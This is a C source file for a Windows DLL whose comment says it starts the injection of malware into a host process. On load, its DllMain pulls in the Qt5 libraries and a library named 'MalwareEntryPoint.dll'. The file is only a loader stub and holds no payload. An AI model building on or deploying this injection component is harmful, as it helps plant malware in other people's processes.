#include <Windows.h>

#ifdef QT_NO_DEBUG
    #define CORE_DLL L"Qt5Core.dll"
    #define GUID_DLL L"Qt5Gui.dll"
    #define WIDGETS_DLL L"Qt5Widgets.dll"
#else
    #define CORE_DLL L"Qt5Cored.dll"
    #define GUID_DLL L"Qt5Guid.dll"
    #define WIDGETS_DLL L"Qt5Widgetsd.dll"
#endif


/**
 * @brief The entry point of the DLL that starts the injection of the malware in a given process.
 * @param hinstDLL handle to DLL module
 * @param fdwReason reason for calling function
 * @param lpReserved reserved
 * @return Returns TRUE if the injection succeed, otherwise FALSE.
 * @see https://msdn.microsoft.com/en-us/library/windows/desktop/ms682596(v=vs.85).aspx
 */
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            if(LoadLibrary(CORE_DLL) == NULL) return FALSE;
            if(LoadLibrary(GUID_DLL) == NULL) return FALSE;
            if(LoadLibrary(WIDGETS_DLL) == NULL) return FALSE;
            if(LoadLibrary(L"MalwareEntryPoint.dll") == NULL) return FALSE;
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
